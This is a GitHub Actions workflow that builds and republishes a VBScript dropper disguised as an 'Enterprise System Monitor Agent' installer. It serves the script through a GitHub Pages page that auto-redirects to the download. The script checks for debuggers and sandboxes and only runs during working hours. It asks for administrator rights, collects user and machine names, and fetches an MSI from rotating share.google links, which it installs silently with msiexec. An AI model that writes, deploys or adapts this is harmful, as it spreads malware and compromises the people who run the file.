name: Update VBS

on:
  schedule:
    - cron: '*/10 * * * *'
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
    - name: Create Bulky VBS file
      run: |
        # Define your links
        links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
        
        # Get current link based on 10-minute interval
        current_minute=$(date +%M)
        link_index=$((current_minute / 10 % 10))
        current_link=${links[$link_index]}
        
        echo "Creating bulky VBS with link: $current_link"
        
        # Create a bulky VBS with lots of junk code using echo commands
        echo "' --------------------------------------------------------------------------" > installer.vbs
        echo "'  Enterprise System Monitor Agent v3.7.2" >> installer.vbs
        echo "'  Copyright (c) 2023 Enterprise Solutions Inc." >> installer.vbs
        echo "' --------------------------------------------------------------------------" >> installer.vbs
        echo "Option Explicit" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Initialize system variables" >> installer.vbs
        echo "Dim WshShell, Fso, NetObj" >> installer.vbs
        echo "Set WshShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
        echo "Set Fso = CreateObject(\"Scripting.FileSystemObject\")" >> installer.vbs
        echo "Set NetObj = CreateObject(\"WScript.Network\")" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Dummy variables for obfuscation" >> installer.vbs
        echo "Dim dummy1, dummy2, dummy3, dummy4, dummy5" >> installer.vbs
        echo "dummy1 = \"System initialization\"" >> installer.vbs
        echo "dummy2 = \"Network configuration\"" >> installer.vbs
        echo "dummy3 = \"Security validation\"" >> installer.vbs
        echo "dummy4 = \"Performance monitoring\"" >> installer.vbs
        echo "dummy5 = \"Error reporting\"" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Fake system information collection" >> installer.vbs
        echo "Function GetSystemInfo()" >> installer.vbs
        echo "    Dim result" >> installer.vbs
        echo "    result = NetObj.ComputerName & \"|\" & NetObj.UserName" >> installer.vbs
        echo "    GetSystemInfo = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Fake process validation function" >> installer.vbs
        echo "Function ValidateProcess(processName)" >> installer.vbs
        echo "    Dim colProcesses, objProcess" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    Set colProcesses = GetObject(\"winmgmts:\").ExecQuery(\"Select * From Win32_Process Where Name='\" & processName & \"'\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    ValidateProcess = False" >> installer.vbs
        echo "    For Each objProcess in colProcesses" >> installer.vbs
        echo "        ValidateProcess = True" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Fake network adapter information" >> installer.vbs
        echo "Function GetNetworkInfo()" >> installer.vbs
        echo "    Dim result" >> installer.vbs
        echo "    result = \"Network adapter: \" & NetObj.ComputerName" >> installer.vbs
        echo "    GetNetworkInfo = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Registry operations helper" >> installer.vbs
        echo "Function ReadRegKey(keyPath, valueName)" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    ReadRegKey = WshShell.RegRead(keyPath & \"\\\" & valueName)" >> installer.vbs
        echo "    If Err.Number <> 0 Then ReadRegKey = \"\"" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Write registry value" >> installer.vbs
        echo "Sub WriteRegKey(keyPath, valueName, value)" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    WshShell.RegWrite keyPath & \"\\\" & valueName, value, \"REG_SZ\"" >> installer.vbs
        echo "End Sub" >> installer.vbs
        echo "" >> installer.vbs
        echo "' File operations helper" >> installer.vbs
        echo "Function CreateTempFile(prefix, extension)" >> installer.vbs
        echo "    Dim tempFolder, fileName" >> installer.vbs
        echo "    tempFolder = WshShell.ExpandEnvironmentStrings(\"%TEMP%\")" >> installer.vbs
        echo "    fileName = tempFolder & \"\\\" & prefix & \"_\" & Round(Timer * 1000) & \".\" & extension" >> installer.vbs
        echo "    Set CreateTempFile = Fso.CreateTextFile(fileName, True)" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Encryption helper function" >> installer.vbs
        echo "Function SimpleEncrypt(text)" >> installer.vbs
        echo "    Dim i, result" >> installer.vbs
        echo "    result = \"\"" >> installer.vbs
        echo "    For i = 1 To Len(text)" >> installer.vbs
        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "    SimpleEncrypt = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Decryption helper function" >> installer.vbs
        echo "Function SimpleDecrypt(text)" >> installer.vbs
        echo "    Dim i, result" >> installer.vbs
        echo "    result = \"\"" >> installer.vbs
        echo "    For i = 1 To Len(text)" >> installer.vbs
        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "    SimpleDecrypt = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for elevated privileges" >> installer.vbs
        echo "Function IsElevated()" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    IsElevated = False" >> installer.vbs
        echo "    If WScript.Arguments.Named.Exists(\"elevated\") Then" >> installer.vbs
        echo "        IsElevated = True" >> installer.vbs
        echo "    Else" >> installer.vbs
        echo "        CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> installer.vbs
        echo "        WScript.Quit" >> installer.vbs
        echo "    End If" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Network connectivity check" >> installer.vbs
        echo "Function CheckConnection(url)" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    Dim objHTTP" >> installer.vbs
        echo "    Set objHTTP = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")" >> installer.vbs
        echo "    objHTTP.open \"HEAD\", url, False" >> installer.vbs
        echo "    objHTTP.send()" >> installer.vbs
        echo "    If objHTTP.Status = 200 Then" >> installer.vbs
        echo "        CheckConnection = True" >> installer.vbs
        echo "    Else" >> installer.vbs
        echo "        CheckConnection = False" >> installer.vbs
        echo "    End If" >> installer.vbs
        echo "    Set objHTTP = Nothing" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Fake hardware fingerprint generation" >> installer.vbs
        echo "Function GetHardwareFingerprint()" >> installer.vbs
        echo "    Dim result" >> installer.vbs
        echo "    result = NetObj.ComputerName & \"_\" & NetObj.UserName" >> installer.vbs
        echo "    GetHardwareFingerprint = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Fake memory status check" >> installer.vbs
        echo "Function GetMemoryStatus()" >> installer.vbs
        echo "    Dim result" >> installer.vbs
        echo "    result = \"Memory status: OK\"" >> installer.vbs
        echo "    GetMemoryStatus = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Fake disk space check" >> installer.vbs
        echo "Function GetDiskSpace(drive)" >> installer.vbs
        echo "    Dim result" >> installer.vbs
        echo "    result = \"Disk \" & drive & \": Available\"" >> installer.vbs
        echo "    GetDiskSpace = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' User account information" >> installer.vbs
        echo "Function GetUserInfo()" >> installer.vbs
        echo "    GetUserInfo = NetObj.UserName & \"|\" & NetObj.ComputerName & \"|\" & NetObj.UserDomain" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for debugger processes" >> installer.vbs
        echo "Function IsDebuggerPresent()" >> installer.vbs
        echo "    Dim debuggers, proc" >> installer.vbs
        echo "    debuggers = Array(\"ollydbg.exe\", \"windbg.exe\", \"x64dbg.exe\", \"ida.exe\", \"ida64.exe\", \"idaq.exe\", \"idaq64.exe\", \"cheatengine.exe\", \"procmon.exe\", \"procexp.exe\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    IsDebuggerPresent = False" >> installer.vbs
        echo "    For Each proc In debuggers" >> installer.vbs
        echo "        If ValidateProcess(proc) Then" >> installer.vbs
        echo "            IsDebuggerPresent = True" >> installer.vbs
        echo "            Exit For" >> installer.vbs
        echo "        End If" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Anti-sandbox time delay" >> installer.vbs
        echo "Sub AntiSandboxDelay()" >> installer.vbs
        echo "    Dim startTime, endTime" >> installer.vbs
        echo "    startTime = Timer" >> installer.vbs
        echo "    endTime = startTime + 30 ' 30 second delay" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    Do While Timer < endTime" >> installer.vbs
        echo "        ' Do nothing - just waste time" >> installer.vbs
        echo "        Dim dummy" >> installer.vbs
        echo "        dummy = dummy & \"x\"" >> installer.vbs
        echo "    Loop" >> installer.vbs
        echo "End Sub" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for mouse activity (sandbox detection)" >> installer.vbs
        echo "Function HasMouseActivity()" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    Dim objShell" >> installer.vbs
        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    ' Get mouse position twice with a small delay" >> installer.vbs
        echo "    Dim pos1, pos2" >> installer.vbs
        echo "    pos1 = objShell.AppActivate(\"WScript\")" >> installer.vbs
        echo "    WScript.Sleep 1000" >> installer.vbs
        echo "    pos2 = objShell.AppActivate(\"WScript\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    ' If positions are the same, likely a sandbox" >> installer.vbs
        echo "    HasMouseActivity = (pos1 <> pos2)" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Get Windows version details" >> installer.vbs
        echo "Function GetWindowsVersion()" >> installer.vbs
        echo "    Dim objShell" >> installer.vbs
        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
        echo "    GetWindowsVersion = objShell.RegRead(\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName\")" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for specific files" >> installer.vbs
        echo "Function FileExists(filePath)" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    FileExists = Fso.FileExists(filePath)" >> installer.vbs
        echo "    If Err.Number <> 0 Then FileExists = False" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Get environment variable" >> installer.vbs
        echo "Function GetEnvVar(varName)" >> installer.vbs
        echo "    GetEnvVar = WshShell.ExpandEnvironmentStrings(\"%\" & varName & \" %\")" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' More junk functions to add bulk" >> installer.vbs
        echo "Function FakeFunction1()" >> installer.vbs
        echo "    FakeFunction1 = \"Fake result 1\"" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "Function FakeFunction2()" >> installer.vbs
        echo "    FakeFunction2 = \"Fake result 2\"" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "Function FakeFunction3()" >> installer.vbs
        echo "    FakeFunction3 = \"Fake result 3\"" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "Function FakeFunction4()" >> installer.vbs
        echo "    FakeFunction4 = \"Fake result 4\"" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "Function FakeFunction5()" >> installer.vbs
        echo "    FakeFunction5 = \"Fake result 5\"" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Main execution starts here" >> installer.vbs
        echo "' Perform system checks" >> installer.vbs
        echo "Dim systemInfo, networkInfo, hwFingerprint, memStatus, diskSpace, userInfo" >> installer.vbs
        echo "systemInfo = GetSystemInfo()" >> installer.vbs
        echo "networkInfo = GetNetworkInfo()" >> installer.vbs
        echo "hwFingerprint = GetHardwareFingerprint()" >> installer.vbs
        echo "memStatus = GetMemoryStatus()" >> installer.vbs
        echo "diskSpace = GetDiskSpace(\"C:\")" >> installer.vbs
        echo "userInfo = GetUserInfo()" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Anti-analysis checks" >> installer.vbs
        echo "If IsDebuggerPresent() Then WScript.Quit" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Time-based anti-sandbox" >> installer.vbs
        echo "If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for user activity" >> installer.vbs
        echo "If Not HasMouseActivity() Then WScript.Quit" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Additional delay to frustrate analysis" >> installer.vbs
        echo "AntiSandboxDelay" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check elevation status" >> installer.vbs
        echo "If Not IsElevated() Then WScript.Quit" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Core functionality - download and execute" >> installer.vbs
        echo "Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objShell" >> installer.vbs
        echo "strUrl = \"$current_link\"" >> installer.vbs
        echo "strTemp = WshShell.ExpandEnvironmentStrings(\"%TEMP%\")" >> installer.vbs
        echo "strFile = strTemp & \"\\agent_installer.msi\"" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Download with proper redirect handling" >> installer.vbs
        echo "Set objXMLHTTP = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")" >> installer.vbs
        echo "objXMLHTTP.open \"GET\", strUrl, False" >> installer.vbs
        echo "objXMLHTTP.send()" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for any redirect (301, 302, etc.)" >> installer.vbs
        echo "If objXMLHTTP.Status >= 300 And objXMLHTTP.Status < 400 Then" >> installer.vbs
        echo "    strUrl = objXMLHTTP.getResponseHeader(\"Location\")" >> installer.vbs
        echo "    objXMLHTTP.open \"GET\", strUrl, False" >> installer.vbs
        echo "    objXMLHTTP.send()" >> installer.vbs
        echo "End If" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Verify download" >> installer.vbs
        echo "If Not Fso.FileExists(strFile) Then" >> installer.vbs
        echo "    WScript.Echo \"Download failed - file not found\"" >> installer.vbs
        echo "    WScript.Quit" >> installer.vbs
        echo "End If" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check file size" >> installer.vbs
        echo "Set objFile = Fso.GetFile(strFile)" >> installer.vbs
        echo "If objFile.Size < 1024 Then  ' Less than 1KB suggests incomplete download" >> installer.vbs
        echo "    WScript.Echo \"Downloaded file appears incomplete: \" & objFile.Size & \" bytes\"" >> installer.vbs
        echo "    WScript.Quit" >> installer.vbs
        echo "End If" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Create installation log" >> installer.vbs
        echo "logFile = strTemp & \"\\install.log\"" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check if we got a successful response" >> installer.vbs
        echo "If objXMLHTTP.Status = 200 Then" >> installer.vbs
        echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> installer.vbs
        echo "    objADOStream.Open" >> installer.vbs
        echo "    objADOStream.Type = 1 ' Binary" >> installer.vbs
        echo "    objADOStream.Write objXMLHTTP.ResponseBody" >> installer.vbs
        echo "    objADOStream.Position = 0" >> installer.vbs
        echo "    objADOStream.SaveToFile strFile, 2 ' Overwrite" >> installer.vbs
        echo "    objADOStream.Close" >> installer.vbs
        echo "" >> installer.vbs
        echo "    ' Try installation with logging and visible window" >> installer.vbs
        echo "    WScript.Echo \"Installing... This may take a few minutes.\"" >> installer.vbs
        echo "    objShell.Run \"msiexec /i \"\"\" & strFile & \"\"\" /l*v \"\"\" & logFile & \"\"\" /quiet /qn /norestart\", 1, True" >> installer.vbs
        echo "" >> installer.vbs
        echo "    ' Check if installation succeeded" >> installer.vbs
        echo "    If Fso.FileExists(logFile) Then" >> installer.vbs
        echo "        Set objLog = Fso.OpenTextFile(logFile, 1)" >> installer.vbs
        echo "        logContent = objLog.ReadAll" >> installer.vbs
        echo "        objLog.Close" >> installer.vbs
        echo "        " >> installer.vbs
        echo "        ' Look for success or failure" >> installer.vbs
        echo "        If InStr(logContent, \"Installation completed successfully\") > 0 Then" >> installer.vbs
        echo "            WScript.Echo \"Installation completed successfully\"" >> installer.vbs
        echo "        ElseIf InStr(logContent, \"Error\") > 0 Or InStr(logContent, \"failed\") > 0 Then" >> installer.vbs
        echo "            WScript.Echo \"Installation failed. Check log file: \" & logFile" >> installer.vbs
        echo "            WScript.Echo \"Last few lines of log:\"" >> installer.vbs
        echo "            " >> installer.vbs
        echo "            ' Show last few lines of log" >> installer.vbs
        echo "            lines = Split(logContent, vbCrLf)" >> installer.vbs
        echo "            For i = UBound(lines) - 5 To UBound(lines)" >> installer.vbs
        echo "                If i >= 0 Then WScript.Echo lines(i)" >> installer.vbs
        echo "            Next" >> installer.vbs
        echo "        Else" >> installer.vbs
        echo "            WScript.Echo \"Installation status unclear. Check log file: \" & logFile" >> installer.vbs
        echo "        End If" >> installer.vbs
        echo "    Else" >> installer.vbs
        echo "        WScript.Echo \"Installation log not created - installation may have failed immediately\"" >> installer.vbs
        echo "    End If" >> installer.vbs
        echo "" >> installer.vbs
        echo "    ' Cleanup" >> installer.vbs
        echo "    If Fso.FileExists(strFile) Then Fso.DeleteFile strFile" >> installer.vbs
        echo "Else" >> installer.vbs
        echo "    WScript.Echo \"Download failed with status: \" & objXMLHTTP.Status" >> installer.vbs
        echo "End If" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Additional cleanup and logging" >> installer.vbs
        echo "Dim sysLogFile, logContent" >> installer.vbs
        echo "Set sysLogFile = Fso.CreateTextFile(WshShell.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\sysmon.log\", True)" >> installer.vbs
        echo "logContent = \"System Info: \" & systemInfo & vbCrLf & _" >> installer.vbs
        echo "             \"Network Info: \" & networkInfo & vbCrLf & _" >> installer.vbs
        echo "             \"Hardware ID: \" & hwFingerprint & vbCrLf & _" >> installer.vbs
        echo "             \"Memory: \" & memStatus & vbCrLf & _" >> installer.vbs
        echo "             \"Disk Space: \" & diskSpace & vbCrLf & _" >> installer.vbs
        echo "             \"User Info: \" & userInfo & vbCrLf & _" >> installer.vbs
        echo "             \"Windows Version: \" & GetWindowsVersion() & vbCrLf & _" >> installer.vbs
        echo "             \"Execution Time: \" & Now" >> installer.vbs
        echo "" >> installer.vbs
        echo "sysLogFile.WriteLine logContent" >> installer.vbs
        echo "sysLogFile.Close" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Final cleanup" >> installer.vbs
        echo "Set WshShell = Nothing" >> installer.vbs
        echo "Set Fso = Nothing" >> installer.vbs
        echo "Set NetObj = Nothing" >> installer.vbs
        echo "Set objXMLHTTP = Nothing" >> installer.vbs
        echo "Set objADOStream = Nothing" >> installer.vbs
        echo "Set objShell = Nothing"
        
        # Create index.html for GitHub Pages
        echo '<!DOCTYPE html><html><head><title>Download</title><meta http-equiv="refresh" content="0; url=installer.vbs"></head><body><p>If not redirected, <a href="installer.vbs">click here</a></p></body></html>' > index.html
        
        # Commit and push the updated files
        git config --global user.email "action@github.com"
        git config --global user.name "GitHub Action"
        git add installer.vbs index.html
        git commit -m "Update bulky VBS with current link" || exit 0
        git push
        
        echo "Bulky VBS file created successfully"
